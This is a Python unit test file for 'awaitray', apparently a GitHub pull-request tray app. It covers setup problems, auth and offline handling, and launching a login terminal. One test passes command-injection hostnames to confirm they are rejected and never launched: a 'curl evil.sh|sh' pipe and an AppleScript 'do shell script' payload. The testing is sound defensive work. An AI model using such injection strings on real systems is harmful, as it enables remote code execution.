"""First run, setup problems, auth failures and offline."""

import unittest
from unittest import mock

from awaitray import config as cfg_mod
from awaitray import github as gh
from awaitray import menu_model as mm
from awaitray import pr_sync
from awaitray.config import Config, HostConfig
from awaitray.controller import SETUP_GH_MISSING, SETUP_NO_HOSTS, Controller, PollResult


class _UI:
    def __init__(self):
        self.prefs_opened = 0
        self.notifications = []

    def present_prefs(self):
        self.prefs_opened += 1

    def notify(self, title, body, urgency, icon):
        self.notifications.append((title, body))

    def __getattr__(self, _name):
        return lambda *a, **k: None


def _ctl(**cfg):
    ui = _UI()
    return Controller(ui=ui, host=ui, cfg=Config(**cfg)), ui


def _labels(ctl):
    return [i.label for i in ctl.menu_model().items]


def _fail(ctl, host_errors, prs=()):
    errors = [f"{h}: boom" for h in host_errors]
    total = not prs
    ctl.apply_poll_result(
        PollResult(
            review_prs=list(prs),
            errors=errors,
            total_failure=total,
            failed_hosts=set(host_errors),
            host_errors=host_errors,
        )
    )


class ClassifyErrorTests(unittest.TestCase):
    def test_kinds(self):
        cases = {
            "gh CLI not found in PATH": gh.ERR_MISSING,
            "To get started with GitHub CLI, please run:  gh auth login": gh.ERR_AUTH,
            "HTTP 401: Bad credentials (https://api.github.com/graphql)": gh.ERR_AUTH,
            "error connecting to api.github.com: dial tcp: no such host": gh.ERR_NETWORK,
            "Post https://ghe.corp/api/graphql: net/http: TLS handshake timeout": gh.ERR_NETWORK,
            "Something else entirely": gh.ERR_OTHER,
        }
        for message, kind in cases.items():
            self.assertEqual(gh.classify_error(message), kind, message)
            self.assertEqual(gh.GhError(message).kind, kind)


class SetupProblemTests(unittest.TestCase):
    def test_gh_missing_blocks_the_menu_with_an_install_link(self):
        ctl, _ = _ctl()
        with mock.patch.object(gh, "gh_available", return_value=False):
            ctl.apply_poll_result(pr_sync.poll(ctl.cfg))
        self.assertEqual(ctl.setup_problem, SETUP_GH_MISSING)
        labels = _labels(ctl)
        self.assertEqual(labels[0], "GitHub CLI (gh) not found")
        self.assertIn("Install the GitHub CLI (gh)…", labels)
        self.assertFalse(any(label.startswith("NEEDS YOUR") for label in labels))

    def test_no_enabled_hosts(self):
        ctl, _ = _ctl(hosts=[HostConfig("github.com", enabled=False)])
        with mock.patch.object(gh, "gh_available", return_value=True):
            ctl.apply_poll_result(pr_sync.poll(ctl.cfg))
        self.assertEqual(ctl.setup_problem, SETUP_NO_HOSTS)
        item = next(i for i in ctl.menu_model().items if i.label == "Set up awaitray…")
        self.assertEqual(item.action, mm.Action("prefs"))

    def test_a_successful_poll_clears_the_problem(self):
        ctl, _ = _ctl()
        ctl.apply_poll_result(PollResult(setup_problem=SETUP_GH_MISSING))
        ctl.apply_poll_result(PollResult())
        self.assertIsNone(ctl.setup_problem)
        self.assertIn("NEEDS YOUR REVIEW · 0", _labels(ctl))


class AuthAndOfflineTests(unittest.TestCase):
    def test_not_logged_in_anywhere_shows_login_items_only(self):
        ctl, _ = _ctl(hosts=[HostConfig("github.com"), HostConfig("ghe.corp")])
        _fail(ctl, {"github.com": gh.ERR_AUTH, "ghe.corp": gh.ERR_AUTH})
        labels = _labels(ctl)
        self.assertEqual(labels[0], "Not logged in to ghe.corp, github.com")
        self.assertIn("Log in to github.com…", labels)
        self.assertIn("Log in to ghe.corp…", labels)
        self.assertFalse(any(label.startswith("NEEDS YOUR") for label in labels))

    def test_partial_auth_failure_keeps_the_menu_and_adds_a_login_item(self):
        from awaitray.github import PullRequest

        pr = PullRequest("github.com", "a/b", 1, "t", "u", "x")
        ctl, _ = _ctl(hosts=[HostConfig("github.com"), HostConfig("ghe.corp")])
        _fail(ctl, {"ghe.corp": gh.ERR_AUTH}, prs=[pr])
        labels = _labels(ctl)
        self.assertIn("Log in to ghe.corp…", labels)
        self.assertIn("NEEDS YOUR REVIEW · 1", labels)

    def test_offline_is_not_an_auth_error(self):
        ctl, _ = _ctl()
        _fail(ctl, {"github.com": gh.ERR_NETWORK})
        self.assertTrue(ctl.offline)
        self.assertEqual(_labels(ctl)[0], "Offline, will retry")
        self.assertNotIn("Log in to github.com…", _labels(ctl))

    def test_login_action_opens_a_terminal_or_explains(self):
        ctl, ui = _ctl()
        with mock.patch.object(gh, "launch_login", return_value=None) as launch:
            ctl.perform(mm.Action("login", ("ghe.corp",)))
        launch.assert_called_once_with("ghe.corp")
        self.assertEqual(ui.notifications, [])
        with mock.patch.object(
            gh, "launch_login", return_value="Run this in a terminal: gh auth login"
        ):
            ctl.perform(mm.Action("login", ("ghe.corp",)))
        self.assertIn("gh auth login", ui.notifications[-1][1])


class FirstRunTests(unittest.TestCase):
    def test_first_run_that_cannot_poll_opens_preferences_once(self):
        with mock.patch.object(cfg_mod, "created_fresh", True):
            ctl, ui = _ctl()
            ctl.apply_poll_result(PollResult(setup_problem=SETUP_GH_MISSING))
            ctl.apply_poll_result(PollResult(setup_problem=SETUP_GH_MISSING))
        self.assertEqual(ui.prefs_opened, 1)

    def test_existing_install_never_auto_opens_preferences(self):
        with mock.patch.object(cfg_mod, "created_fresh", False):
            ctl, ui = _ctl()
            ctl.apply_poll_result(PollResult(setup_problem=SETUP_GH_MISSING))
        self.assertEqual(ui.prefs_opened, 0)


class LaunchLoginTests(unittest.TestCase):
    def test_linux_uses_the_first_terminal_found(self):
        with (
            mock.patch("sys.platform", "linux"),
            mock.patch.object(gh.shutil, "which", side_effect=lambda b: b == "konsole"),
            mock.patch.object(gh.subprocess, "Popen") as popen,
        ):
            self.assertIsNone(gh.launch_login("ghe.corp"))
        self.assertEqual(popen.call_args.args[0][:2], ["konsole", "-e"])
        self.assertIn("ghe.corp", popen.call_args.args[0])

    def test_no_terminal_explains_what_to_run(self):
        with (
            mock.patch("sys.platform", "linux"),
            mock.patch.object(gh.shutil, "which", return_value=None),
        ):
            msg = gh.launch_login("ghe.corp")
        self.assertIn("gh auth login --hostname ghe.corp", msg)

    def test_a_hostname_that_is_not_one_is_never_launched(self):
        for host in (
            "github.com; curl evil.sh|sh #",
            'x" & do shell script "id',
            "-h",
            "",
            "a.b\n",
        ):
            with (
                mock.patch("sys.platform", "darwin"),
                mock.patch.object(gh.subprocess, "Popen") as popen,
            ):
                self.assertIn("not a hostname", gh.launch_login(host))
            popen.assert_not_called()

    def test_valid_hostnames(self):
        for host in ("github.com", "ghe.corp:8443", "git.example.co.uk", "localhost"):
            self.assertTrue(gh.valid_hostname(host), host)

    def test_macos_uses_terminal_app(self):
        with (
            mock.patch("sys.platform", "darwin"),
            mock.patch.object(gh.subprocess, "Popen") as popen,
        ):
            self.assertIsNone(gh.launch_login("github.com"))
        self.assertEqual(popen.call_args.args[0][0], "osascript")


if __name__ == "__main__":
    unittest.main()
